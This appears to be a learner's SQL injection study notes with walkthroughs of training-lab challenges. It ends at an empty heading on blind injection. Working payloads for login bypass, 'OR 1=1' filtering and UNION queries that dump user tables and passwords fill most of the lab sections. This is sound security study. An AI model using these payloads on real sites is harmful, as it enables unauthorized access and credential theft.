SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. <br>
A successful SQL injection attack can result in unauthorized access to sensitive data, such as: <br>
    Passwords. <br>
    Credit card details. <br>
    Personal user information <br>
Some common SQL injection examples include: <br>
    1.Retrieving hidden data, where you can modify a SQL query to return additional results. <br>
    2.Subverting application logic, where you can change a query to interfere with the application's logic. <br>
    3.UNION attacks, where you can retrieve data from different database tables. <br>
    4.Blind SQL injection, where the results of a query you control are not returned in the application's responses. <br>

```bash 
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```
Note that ```--``` is a comment indicator in SQL. This means that the rest of the query is interpreted as a comment, effectively removing it. In this example, this means the query no longer includes ```AND released = 1.``` As a result, all products are displayed, including those that are not yet released.

Another attack:
```bash
https://insecure-website.com/products?category=Gifts'+OR+1=1--
```
This results in SQL query:
```bash
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```
The modified query returns all items where either the category is Gifts, or 1 is equal to 1. As 1=1 is always true, the query returns all items.

## Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
In this i was asked to perform a SQL injection attack that causes the application to display one or more unreleased products . In this link
```bash
https://0a2a0093037a7ee681e8a21e005c0065.web-security-academy.net/filter?category=Lifestyle
```
I added ```'+OR+1=1--``` to get the information and it worked.

## Lab: SQL injection vulnerability allowing login bypass:
This challenge asked to bypass a login page as administrator so in the username section i added ```administrator'--``` to login as now becuase of ```--``` it will not check the password. This is how i solved the lab.

# Retrieving data from other database tables:
For example, if an application executes the following query containing the user input Gifts:
```bash
SELECT name, description FROM products WHERE category = 'Gifts'
```
An attacker can submit:
```bash
' UNION SELECT username, password FROM users--
```
This causes the application to return all usernames and passwords along with the names and descriptions of products.

# Second-order SQL injection:
```First-order SQL injection``` occurs when the application processes user input from an HTTP request and incorporates the input into a SQL query in an unsafe way.
```Second-order SQL injection``` occurs when the application takes user input from an HTTP request and stores it for future use. This is usually done by placing the input into a database, but no vulnerability occurs at the point where the data is stored. Later, when handling a different HTTP request, the application retrieves the stored data and incorporates it into a SQL query in an unsafe way. For this reason, second-order SQL injection is also known as stored SQL injection.


# Examining the database
You can query the version details for the database. Different methods work for different database types. This means that if you find a particular method that works, you can infer the database type. For example, on Oracle you can execute:
```bash
SELECT * FROM v$version
```
You can also identify what database tables exist, and the columns they contain. For example, on most databases you can execute the following query to list the tables:
```bash
SELECT * FROM information_schema.tables
```

## Lab: SQL injection with filter bypass via XML encoding:
To solve the lab, perform a SQL injection attack to retrieve the admin user's credentials, then log in to their account. I used Burp suite to solve this challenge. with the help of extension i used ```hackvertor``` extension which helped me encode my data to XML format using ```dec_entities/hex_entities.```

## How to prevent SQLi:
You can prevent most instances of SQL injection using parameterized queries instead of string concatenation within the query. These parameterized queries are also know as "prepared statements".

## Lab: SQL injection attack, querying the database type and version on Oracle:
Used Burp suit to query it. I saw when i click category it is query so i can put injection in that first i tried to print all column using ```UNION```
```bash
'+UNION+SELECT+'abc','def'+FROM+dual--
```
After this i saw i can see hidden stuff also so came to know i am in right direction. After this:
```bash
'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
```
It displayed the database version.


## Lab: SQL injection attack, listing the database contents on non-Oracle databases:
in this i need to do a UNION attack to get the table and the column to get find where the username and the password are stored in the datbase it was a non_oracle database i need top refer cheat sheet for it i use 
```bash
https://0ae9005f03bbc1c382e8a7c800cc0009.web-security-academy.net/filter?category=Corporate+gifts%27+union+select+table_name,null+from+information_schema.tables--
```
To display the hidden table. I found one data ```users_fglvqz``` which could contain login information so now i put a link:
```bash
https://0ae9005f03bbc1c382e8a7c800cc0009.web-security-academy.net/filter?category=Corporate+gifts%27+union+select+column_name,null+from+information_schema.columns+where+table_name=%27users_fglvqz%27--
```
i got the column_name that contains the user and pass which was username column was ```username_cwhlov``` and password column was ```password_wbhfsw```.
As now i know the column name also my input was:
```bash
https://0ae9005f03bbc1c382e8a7c800cc0009.web-security-academy.net/filter?category=Corporate+gifts%27+union+select+username_cwhlov,password_wbhfsw+from+users_fglvqz-
```
it displayed the administrator and password.

## Lab: SQL injection attack, listing the database contents on Oracle:
I first decided to print all the table so after seeing the cheat sheet i put the commans:
```bash
https://0af000d4038da6868019bcd9008f0034.web-security-academy.net/filter?category=Corporate+gifts%27+union+select+table_name,null+from+all_tables--
```
i used ```all_tables``` as it is a oracle database.
i now decided to get column from table 
```bash
https://0af000d4038da6868019bcd9008f0034.web-security-academy.net/filter?category=Corporate+gifts%27+union+select+column_name,null+from+all_tab_columns+where+table_name=%27USERS_YVITGQ%27--
```
i got the two column name for the user and password.
```bash
https://0af000d4038da6868019bcd9008f0034.web-security-academy.net/filter?category=Corporate+gifts%27+union+select+EMAIL,PASSWORD_TAIUGS+from+USERS_YVITGQ--
```
after running this i got the password.

## Lab: SQL injection UNION attack, determining the number of columns returned by the query
To determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values.
i starting adding the null column
```bash
https://0ae600de03aad8ea82d1519e00ba00ac.web-security-academy.net/filter?category=Corporate+gifts%27+UNION+SELECT+NULL--
```
I got an error so i starting to get mor null to see the output.
```bash
https://0ae600de03aad8ea82d1519e00ba00ac.web-security-academy.net/filter?category=Corporate+gifts%27+UNION+SELECT+NULL,null,null--
```
with this i solved the challenge.

## Lab: Blind SQL injection with conditional responses:

